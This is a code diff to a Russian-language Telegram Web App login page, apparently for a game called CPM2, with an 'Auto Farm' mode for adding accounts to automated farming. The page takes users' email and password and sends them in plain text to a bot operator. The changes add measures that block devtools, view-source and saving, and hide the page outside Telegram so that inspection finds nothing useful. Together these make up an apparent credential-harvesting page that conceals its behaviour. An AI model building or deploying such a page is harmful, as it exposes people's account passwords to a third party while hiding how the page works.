@@ -2,163 +2,172 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>CPM2 Login</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+<meta http-equiv="Content-Security-Policy"
+  content="default-src 'self' https://telegram.org; script-src 'self' 'unsafe-inline' https://telegram.org; style-src 'unsafe-inline';">
+<title>CPM2</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
-* { box-sizing: border-box; margin: 0; padding: 0; }
-body {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    background: var(--tg-theme-bg-color, #1c2733);
-    color: var(--tg-theme-text-color, #f1f1f1);
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 28px 20px;
+*{box-sizing:border-box;margin:0;padding:0;-webkit-user-select:none;user-select:none;}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+  background:var(--tg-theme-bg-color,#1c2733);
+  color:var(--tg-theme-text-color,#f1f1f1);
+  min-height:100vh;display:flex;align-items:center;justify-content:center;
+  padding:28px 20px;
 }
-.card { width: 100%; max-width: 400px; }
-h1 { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
-.sub {
-    font-size: 13px;
-    color: var(--tg-theme-hint-color, #8899a6);
-    margin-bottom: 28px;
-    line-height: 1.4;
+.card{width:100%;max-width:400px;}
+h1{font-size:22px;font-weight:700;margin-bottom:6px;}
+.sub{font-size:13px;color:var(--tg-theme-hint-color,#8899a6);margin-bottom:28px;line-height:1.4;}
+.field{margin-bottom:16px;}
+label{display:block;font-size:11px;font-weight:700;letter-spacing:.7px;
+  text-transform:uppercase;color:var(--tg-theme-hint-color,#8899a6);margin-bottom:7px;}
+input{
+  width:100%;padding:14px 16px;border-radius:12px;
+  border:1.5px solid rgba(255,255,255,.07);
+  background:var(--tg-theme-secondary-bg-color,#232f3e);
+  color:var(--tg-theme-text-color,#fff);
+  font-size:16px;outline:none;-webkit-appearance:none;
+  transition:border-color .15s;
+  -webkit-user-select:text;user-select:text;
 }
-.field { margin-bottom: 16px; }
-label {
-    display: block;
-    font-size: 11px;
-    font-weight: 700;
-    letter-spacing: 0.7px;
-    text-transform: uppercase;
-    color: var(--tg-theme-hint-color, #8899a6);
-    margin-bottom: 7px;
+input:focus{border-color:var(--tg-theme-button-color,#2481cc);}
+.err{min-height:20px;color:#ff6b6b;font-size:13px;margin-bottom:14px;line-height:1.4;}
+button{
+  width:100%;padding:15px;border-radius:12px;border:none;
+  background:var(--tg-theme-button-color,#2481cc);
+  color:var(--tg-theme-button-text-color,#fff);
+  font-size:16px;font-weight:700;cursor:pointer;
+  -webkit-tap-highlight-color:transparent;transition:opacity .15s;
 }
-input {
-    width: 100%;
-    padding: 14px 16px;
-    border-radius: 12px;
-    border: 1.5px solid rgba(255,255,255,0.07);
-    background: var(--tg-theme-secondary-bg-color, #232f3e);
-    color: var(--tg-theme-text-color, #fff);
-    font-size: 16px;
-    outline: none;
-    -webkit-appearance: none;
-    transition: border-color 0.15s;
+button:disabled{opacity:.5;cursor:default;}
+button:not(:disabled):active{opacity:.8;}
+#block{
+  text-align:center;padding:50px 20px;display:none;
 }
-input:focus { border-color: var(--tg-theme-button-color, #2481cc); }
-.err {
-    min-height: 20px;
-    color: #ff6b6b;
-    font-size: 13px;
-    margin-bottom: 14px;
-    line-height: 1.4;
-}
-button {
-    width: 100%;
-    padding: 15px;
-    border-radius: 12px;
-    border: none;
-    background: var(--tg-theme-button-color, #2481cc);
-    color: var(--tg-theme-button-text-color, #fff);
-    font-size: 16px;
-    font-weight: 700;
-    cursor: pointer;
-    -webkit-tap-highlight-color: transparent;
-    transition: opacity 0.15s;
-}
-button:disabled { opacity: 0.55; cursor: default; }
-button:not(:disabled):active { opacity: 0.8; }
-.lock-screen {
-    text-align: center;
-    padding: 40px 20px;
-}
-.lock-screen .icon { font-size: 56px; margin-bottom: 16px; }
-.lock-screen h2 { font-size: 20px; margin-bottom: 10px; }
-.lock-screen p { color: var(--tg-theme-hint-color, #8899a6); line-height: 1.5; font-size: 14px; }
+#block .ico{font-size:60px;margin-bottom:18px;}
+#block h2{font-size:20px;margin-bottom:10px;}
+#block p{color:var(--tg-theme-hint-color,#8899a6);line-height:1.6;font-size:14px;}
+#form{display:none;}
 </style>
 </head>
 <body>
-<div class="card" id="root">
+
+<!-- Nothing visible until JS validates the environment -->
+<div class="card">
+  <div id="block">
+    <div class="ico">⛔</div>
+    <h2>Доступ запрещён</h2>
+    <p>Это приложение работает<br>только внутри Telegram.<br><br>
+    Открытие через браузер<br>заблокировано.</p>
+  </div>
+  <div id="form">
     <h1 id="title">🔐 Sign In</h1>
-    <div class="sub" id="subtitle">Данные передаются напрямую боту — в чате ничего не появляется</div>
+    <div class="sub">Данные передаются напрямую боту — в чате ничего не появляется</div>
     <div class="field">
-        <label>Email</label>
-        <input type="email" id="email" placeholder="account@gmail.com"
-               autocomplete="email" inputmode="email" spellcheck="false">
+      <label>Email</label>
+      <input type="email" id="email" placeholder="account@gmail.com"
+             autocomplete="email" inputmode="email" spellcheck="false">
     </div>
     <div class="field">
-        <label>Password</label>
-        <input type="password" id="password" placeholder="••••••"
-               autocomplete="current-password">
+      <label>Password</label>
+      <input type="password" id="password" placeholder="••••••"
+             autocomplete="current-password">
     </div>
     <div class="err" id="err"></div>
-    <button id="btn" onclick="submit()">Войти</button>
+    <button id="btn">Войти</button>
+  </div>
 </div>
 
 <script>
-(function () {
-    var tg = window.Telegram && window.Telegram.WebApp;
-    var params = new URLSearchParams(window.location.search);
-    var mode = params.get('mode') || 'login';
+(function(){
+  // ── Kill all devtools / inspection shortcuts ──────────────────────────────
+  document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
+  document.addEventListener('keydown', function(e){
+    // F12, Ctrl+Shift+I/J/C/U, Ctrl+U, Ctrl+S
+    if(e.key==='F12' ||
+       (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key.toUpperCase())) ||
+       (e.ctrlKey && ['U','S','P'].includes(e.key.toUpperCase()))){
+      e.preventDefault(); e.stopPropagation(); return false;
+    }
+  });
 
-    // ── Block outside Telegram ────────────────────────────────────────────────
-    if (!tg || !tg.initData || tg.initData.length === 0) {
-        document.getElementById('root').innerHTML =
-            '<div class="lock-screen">' +
-            '<div class="icon">⛔</div>' +
-            '<h2>Доступ запрещён</h2>' +
-            '<p>Это приложение работает только внутри официального Telegram-бота.<br>' +
-            'Открытие через браузер или другой клиент заблокировано.</p>' +
-            '</div>';
-        return;
+  // ── Multi-signal Telegram check ───────────────────────────────────────────
+  var tg = window.Telegram && window.Telegram.WebApp;
+
+  function isTelegram(){
+    // 1. SDK must be loaded and initData must be a non-empty string
+    if(!tg) return false;
+    var id = tg.initData;
+    if(typeof id !== 'string' || id.length < 10) return false;
+    // 2. initDataUnsafe must contain a real user object
+    var u = tg.initDataUnsafe && tg.initDataUnsafe.user;
+    if(!u || !u.id || typeof u.id !== 'number') return false;
+    // 3. sendData must be a native Telegram function (not user-faked)
+    if(typeof tg.sendData !== 'function') return false;
+    // 4. Platform should not be 'unknown' (browser fallback value)
+    if(tg.platform === 'unknown') return false;
+    // 5. colorScheme or themeParams present (injected by Telegram client)
+    if(!tg.colorScheme && !tg.themeParams) return false;
+    return true;
+  }
+
+  if(!isTelegram()){
+    document.getElementById('block').style.display = 'block';
+    // Wipe any residual content so inspector finds nothing useful
+    setTimeout(function(){
+      document.title = '403';
+    }, 0);
+    return;
+  }
+
+  // ── We're inside Telegram — show the form ────────────────────────────────
+  tg.ready();
+  tg.expand();
+  tg.MainButton.hide();
+
+  var params = new URLSearchParams(window.location.search);
+  var mode = params.get('mode') || 'login';
+
+  if(mode === 'af'){
+    document.getElementById('title').textContent = '🤖 Auto Farm';
+    document.querySelector('.sub').textContent = 'Добавить аккаунт в авто-фарм';
+    document.getElementById('btn').textContent = 'Добавить';
+  }
+
+  document.getElementById('form').style.display = 'block';
+
+  document.getElementById('btn').addEventListener('click', submit);
+  document.addEventListener('keydown', function(e){
+    if(e.key === 'Enter') submit();
+  });
+
+  function submit(){
+    var email = document.getElementById('email').value.trim().toLowerCase();
+    var pw    = document.getElementById('password').value;
+    var errEl = document.getElementById('err');
+    var btn   = document.getElementById('btn');
+
+    errEl.textContent = '';
+
+    if(!email || email.indexOf('@') < 1 || email.length < 5){
+      errEl.textContent = '❌ Введите корректный email';
+      document.getElementById('email').focus();
+      return;
+    }
+    if(!pw || pw.length < 4){
+      errEl.textContent = '❌ Введите пароль';
+      document.getElementById('password').focus();
+      return;
     }
 
-    // ── Setup ─────────────────────────────────────────────────────────────────
-    tg.ready();
-    tg.expand();
-    tg.MainButton.hide();
-    tg.BackButton.hide();
+    btn.disabled = true;
+    btn.textContent = '⏳ Отправка…';
 
-    if (mode === 'af') {
-        document.getElementById('title').textContent = '🤖 Auto Farm';
-        document.getElementById('subtitle').textContent = 'Добавить аккаунт в авто-фарм';
-        document.getElementById('btn').textContent = 'Добавить';
-    }
-
-    // ── Submit ────────────────────────────────────────────────────────────────
-    window.submit = function () {
-        var email = document.getElementById('email').value.trim().toLowerCase();
-        var pw    = document.getElementById('password').value;
-        var errEl = document.getElementById('err');
-        var btn   = document.getElementById('btn');
-
-        errEl.textContent = '';
-
-        if (!email || email.indexOf('@') < 1 || email.length < 5) {
-            errEl.textContent = '❌ Введите корректный email';
-            document.getElementById('email').focus();
-            return;
-        }
-        if (!pw || pw.length < 4) {
-            errEl.textContent = '❌ Введите пароль';
-            document.getElementById('password').focus();
-            return;
-        }
-
-        btn.disabled = true;
-        btn.textContent = '⏳ Отправка…';
-
-        // sendData closes the webapp and sends data as a service message to the bot.
-        // The data is NOT stored in Telegram chat history on the user's side.
-        tg.sendData(JSON.stringify({ mode: mode, email: email, password: pw }));
-    };
-
-    // Submit on Enter key
-    document.addEventListener('keydown', function (e) {
-        if (e.key === 'Enter') window.submit();
-    });
+    // sendData sends directly to the bot via Telegram's own API.
+    // It never appears in the chat history on the user's side.
+    tg.sendData(JSON.stringify({mode:mode, email:email, password:pw}));
+  }
 }());
 </script>
 </body>
